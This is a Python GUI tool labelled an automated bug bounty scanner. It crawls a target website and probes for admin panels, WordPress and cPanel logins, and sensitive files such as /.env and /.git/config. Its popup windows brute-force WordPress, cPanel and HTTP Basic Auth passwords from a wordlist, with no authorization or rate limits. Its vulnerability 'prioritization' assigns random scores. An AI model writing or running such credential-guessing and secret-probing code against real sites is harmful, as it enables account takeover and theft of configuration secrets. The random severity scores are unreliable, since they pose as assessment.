import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import random
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import scrolledtext, ttk

HEADERS = {'User-Agent': 'Mozilla/5.0'}

class ThreadSafeSet:
    def __init__(self):
        self.lock = threading.Lock()
        self.set = set()

    def add(self, item):
        with self.lock:
            self.set.add(item)

    def __contains__(self, item):
        with self.lock:
            return item in self.set

    def update(self, items):
        with self.lock:
            self.set.update(items)

    def snapshot(self):
        with self.lock:
            return set(self.set)

def fetch_url(url, stop_event=None):
    if stop_event and stop_event.is_set():
        return None
    try:
        resp = requests.get(url, timeout=5, headers=HEADERS)
        if resp.status_code == 200:
            return resp.text
    except requests.RequestException:
        return None

def normalize_url(url):
    parsed = urlparse(url)
    normalized = parsed._replace(path=parsed.path.rstrip('/')).geturl()
    return normalized

def crawl(url, max_depth=2, visited=None, gui_logger=None, stop_event=None):
    if stop_event and stop_event.is_set():
        return set()

    if visited is None:
        visited = ThreadSafeSet()

    normalized_url = normalize_url(url)

    if max_depth == 0 or normalized_url in visited:
        return visited.snapshot()

    if gui_logger:
        gui_logger(f"[+] Crawling: {normalized_url}")

    visited.add(normalized_url)

    html = fetch_url(normalized_url, stop_event=stop_event)
    if not html or (stop_event and stop_event.is_set()):
        return visited.snapshot()

    soup = BeautifulSoup(html, "html.parser")
    links = set()

    for link in soup.find_all("a", href=True):
        if stop_event and stop_event.is_set():
            return visited.snapshot()
        abs_link = urljoin(normalized_url, link['href'])
        abs_link = normalize_url(abs_link)
        if abs_link.startswith("http") and abs_link not in visited:
            links.add(abs_link)

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(crawl, link, max_depth - 1, visited, gui_logger, stop_event) for link in links]
        for future in as_completed(futures):
            if stop_event and stop_event.is_set():
                break
            try:
                result = future.result()
                if result:
                    visited.update(result)
            except Exception:
                pass

    return visited.snapshot()

def check_urls(urls, paths, gui_logger, stop_event=None):
    found = []
    found_lock = threading.Lock()

    def check(target):
        if stop_event and stop_event.is_set():
            return
        try:
            resp = requests.get(target, timeout=3, headers=HEADERS)
            if resp.status_code in [200, 401, 403]:
                with found_lock:
                    found.append(target)
                if gui_logger:
                    gui_logger(f"[!] Found: {target} (Status: {resp.status_code})")
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for url in urls:
            if stop_event and stop_event.is_set():
                break
            for path in paths:
                if stop_event and stop_event.is_set():
                    break
                target = url.rstrip("/") + path
                futures.append(executor.submit(check, target))
        for _ in as_completed(futures):
            if stop_event and stop_event.is_set():
                break

    return found

def check_admin_panel(urls, gui_logger, stop_event=None):
    admin_paths = ["/admin", "/administrator", "/login", "/user/login"]
    return check_urls(urls, admin_paths, gui_logger, stop_event)

def check_wordpress(urls, gui_logger, stop_event=None):
    wp_paths = [
        "/wp-login.php",
        "/wp-admin/",
        "/xmlrpc.php",
        "/wp-content/",
        "/wp-includes/",
        "/wp-json/"
    ]
    return check_urls(urls, wp_paths, gui_logger, stop_event)

def check_cpanel(urls, gui_logger, stop_event=None):
    cpanel_paths = [
        "/cpanel",
        "/cpanel/login",
        "/cpanel2",
        "/whm",
        "/whm-login"
    ]
    return check_urls(urls, cpanel_paths, gui_logger, stop_event)

def check_hidden_files(urls, gui_logger, stop_event=None):
    hidden_files = [
        "/sitemap.xml",
        "/robots.txt",
        "/.env",
        "/.git/config",
        "/.htaccess",
        "/config.php",
        "/readme.html"
    ]
    return check_urls(urls, hidden_files, gui_logger, stop_event)

def prioritize_vulns(vuln_list, gui_logger):
    prioritized = [(v, random.randint(1, 10)) for v in vuln_list]
    prioritized.sort(key=lambda x: x[1], reverse=True)
    gui_logger("\n[+] Vulnerability Prioritization:")
    for vuln, score in prioritized:
        gui_logger(f"  Score {score}/10: {vuln}")
    return prioritized


class FuturisticScannerApp:
    def __init__(self, root):
        self.root = root
        root.title("⚡ Automated Bug Bounty Scanner ⚡")
        root.geometry("900x600")
        root.configure(bg="#0f0f1e")

        style = ttk.Style()
        style.theme_use('clam')

        style.configure("TButton",
                        font=("Consolas", 14, "bold"),
                        foreground="#00FFAA",
                        background="#111122",
                        borderwidth=0,
                        padding=10)
        style.map("TButton",
                  foreground=[('active', '#00FF00')],
                  background=[('active', '#002200')])

        style.configure("TEntry",
                        fieldbackground="#111122",
                        foreground="#00FFAA",
                        font=("Consolas", 14),
                        bordercolor="#00FFAA",
                        borderwidth=2,
                        padding=5)

        title = tk.Label(root, text="⚡ Automated Bug Bounty Scanner ⚡",
                         font=("Consolas", 24, "bold"),
                         fg="#00FFAA", bg="#0f0f1e")
        title.pack(pady=15)

        input_frame = tk.Frame(root, bg="#0f0f1e")
        input_frame.pack(pady=10)

        self.url_entry = ttk.Entry(input_frame, width=60)
        self.url_entry.pack(side=tk.LEFT, padx=10)
        self.url_entry.insert(0, "https://example.com")

        self.scan_button = ttk.Button(input_frame, text="START SCAN", command=self.start_scan)
        self.scan_button.pack(side=tk.LEFT, padx=10)

        self.stop_button = ttk.Button(input_frame, text="STOP SCAN", command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=10)

        self.add_brute_force_buttons()

        self.log_area = scrolledtext.ScrolledText(root, width=100, height=30,
                                                  bg="#111122", fg="#00FFAA",
                                                  font=("Consolas", 12),
                                                  insertbackground="#00FFAA",
                                                  borderwidth=0)
        self.log_area.pack(padx=20, pady=20)
        self.log_area.config(state=tk.DISABLED)

        self.stop_event = threading.Event()

    def add_brute_force_buttons(self):
        bf_frame = tk.Frame(self.root, bg="#0f0f1e")
        bf_frame.pack(pady=5)

        btn_wp = ttk.Button(bf_frame, text="Brute WordPress", command=self.brute_wordpress_popup)
        btn_wp.pack(side=tk.LEFT, padx=10)

        btn_cpanel = ttk.Button(bf_frame, text="Brute cPanel", command=self.brute_cpanel_popup)
        btn_cpanel.pack(side=tk.LEFT, padx=10)

        btn_http = ttk.Button(bf_frame, text="Brute HTTP Auth", command=self.brute_http_popup)
        btn_http.pack(side=tk.LEFT, padx=10)

    def gui_logger(self, msg):
        def append():
            self.log_area.config(state=tk.NORMAL)
            self.log_area.insert(tk.END, msg + "\n")
            self.log_area.see(tk.END)
            self.log_area.config(state=tk.DISABLED)
        self.root.after(0, append)

    def start_scan(self):
        target = self.url_entry.get().strip()
        if not target.startswith("http"):
            self.gui_logger("[!] Please enter a valid URL (including http/https).")
            return
        self.stop_event.clear()
        self.scan_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_area.config(state=tk.NORMAL)
        self.log_area.delete(1.0, tk.END)
        self.log_area.config(state=tk.DISABLED)
        threading.Thread(target=self.run_scan, args=(target,), daemon=True).start()

    def stop_scan(self):
        self.gui_logger("[!] Stop requested, attempting to stop scan...")
        self.stop_event.set()
        self.stop_button.config(state=tk.DISABLED)
        self.scan_button.config(state=tk.NORMAL)

    def run_scan(self, target):
        self.gui_logger(f"Starting scan on {target}")

        urls = crawl(target, gui_logger=self.gui_logger, stop_event=self.stop_event)
        if self.stop_event.is_set():
            self.gui_logger("[!] Scan stopped by user.")
            return

        self.gui_logger(f"Found {len(urls)} URLs")

        admin_panels = check_admin_panel(urls, self.gui_logger, stop_event=self.stop_event)
        if self.stop_event.is_set():
            self.gui_logger("[!] Scan stopped by user.")
            return

        wordpress = check_wordpress(urls, self.gui_logger, stop_event=self.stop_event)
        if self.stop_event.is_set():
            self.gui_logger("[!] Scan stopped by user.")
            return

        cpanel = check_cpanel(urls, self.gui_logger, stop_event=self.stop_event)
        if self.stop_event.is_set():
            self.gui_logger("[!] Scan stopped by user.")
            return

        hidden_files = check_hidden_files(urls, self.gui_logger, stop_event=self.stop_event)
        if self.stop_event.is_set():
            self.gui_logger("[!] Scan stopped by user.")
            return

        all_findings = admin_panels + wordpress + cpanel + hidden_files
        prioritize_vulns(all_findings, self.gui_logger)

        self.gui_logger("[+] Scan complete.")
        self.stop_button.config(state=tk.DISABLED)
        self.scan_button.config(state=tk.NORMAL)

    def brute_wordpress_popup(self):
        self.brute_popup("WordPress", "/wp-login.php")

    def brute_cpanel_popup(self):
        self.brute_popup("cPanel", "/cpanel")

    def brute_http_popup(self):
        self.brute_popup("HTTP Auth", "")

    def brute_popup(self, service_name, login_path):
        popup = tk.Toplevel(self.root)
        popup.title(f"Brute Force {service_name}")
        popup.geometry("500x400")
        popup.configure(bg="#0f0f1e")

        tk.Label(popup, text=f"Brute Force {service_name} Login",
                 fg="#00FFAA", bg="#0f0f1e", font=("Consolas", 18, "bold")).pack(pady=10)

        tk.Label(popup, text="Target URL:",
                 fg="#00FFAA", bg="#0f0f1e", font=("Consolas", 12)).pack(pady=5)
        target_entry = ttk.Entry(popup, width=50)
        target_entry.pack(pady=5)
        target_entry.insert(0, "https://example.com")

        tk.Label(popup, text="Username:",
                 fg="#00FFAA", bg="#0f0f1e", font=("Consolas", 12)).pack(pady=5)
        username_entry = ttk.Entry(popup, width=30)
        username_entry.pack(pady=5)
        username_entry.insert(0, "admin")

        tk.Label(popup, text="Password List File:",
                 fg="#00FFAA", bg="#0f0f1e", font=("Consolas", 12)).pack(pady=5)
        passlist_entry = ttk.Entry(popup, width=50)
        passlist_entry.pack(pady=5)
        passlist_entry.insert(0, "10k-most-common.txt")

        output_area = scrolledtext.ScrolledText(popup, width=60, height=12,
                                                bg="#111122", fg="#00FFAA",
                                                font=("Consolas", 12),
                                                insertbackground="#00FFAA",
                                                borderwidth=0)
        output_area.pack(padx=10, pady=10)
        output_area.config(state=tk.DISABLED)

        stop_event = threading.Event()

        def log(msg):
            def append():
                output_area.config(state=tk.NORMAL)
                output_area.insert(tk.END, msg + "\n")
                output_area.see(tk.END)
                output_area.config(state=tk.DISABLED)
            popup.after(0, append)

        def brute_thread():
            target_url = target_entry.get().strip()
            if not target_url.startswith("http"):
                log("[!] Invalid URL, must start with http or https.")
                return
            username = username_entry.get().strip()
            passfile = passlist_entry.get().strip()
            if not os.path.isfile(passfile):
                log(f"[!] Password list file not found: {passfile}")
                return

            login_url = target_url.rstrip("/") + login_path if login_path else target_url.rstrip("/")

            log(f"[+] Starting brute force on {login_url} with user '{username}'")

            with open(passfile, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]

            for pwd in passwords:
                if stop_event.is_set():
                    log("[!] Brute force stopped by user.")
                    break
                try:
                    if service_name == "HTTP Auth":
                        resp = requests.get(login_url, auth=(username, pwd), timeout=5, headers=HEADERS)
                        if resp.status_code == 200:
                            log(f"[+] Success! Password found: {pwd}")
                            break
                    else:

                        if service_name == "WordPress":
                            data = {"log": username, "pwd": pwd, "wp-submit": "Log In", "redirect_to": login_url, "testcookie": "1"}
                        elif service_name == "cPanel":
                            data = {"user": username, "pass": pwd}
                        else:
                            data = {}

                        resp = requests.post(login_url, data=data, timeout=5, headers=HEADERS, allow_redirects=False)

                        if resp.status_code in [200, 302]:
                            if "incorrect" not in resp.text.lower() and "invalid" not in resp.text.lower():
                                log(f"[+] Success! Password found: {pwd}")
                                break

                    log(f"[-] Tried password: {pwd}")
                except requests.RequestException as e:
                    log(f"[!] Request error: {e}")

            else:
                log("[!] Password not found in list.")

            start_button.config(state=tk.NORMAL)
            stop_button.config(state=tk.DISABLED)

        def start_brute():
            start_button.config(state=tk.DISABLED)
            stop_button.config(state=tk.NORMAL)
            stop_event.clear()
            threading.Thread(target=brute_thread, daemon=True).start()

        def stop_brute():
            stop_event.set()
            stop_button.config(state=tk.DISABLED)
            start_button.config(state=tk.NORMAL)
            log("[!] Stop requested.")

        control_frame = tk.Frame(popup, bg="#0f0f1e")
        control_frame.pack(pady=10)

        start_button = ttk.Button(control_frame, text="Start Brute Force", command=start_brute)
        start_button.pack(side=tk.LEFT, padx=10)

        stop_button = ttk.Button(control_frame, text="Stop", command=stop_brute, state=tk.DISABLED)
        stop_button.pack(side=tk.LEFT, padx=10)


def main():
    root = tk.Tk()
    app = FuturisticScannerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
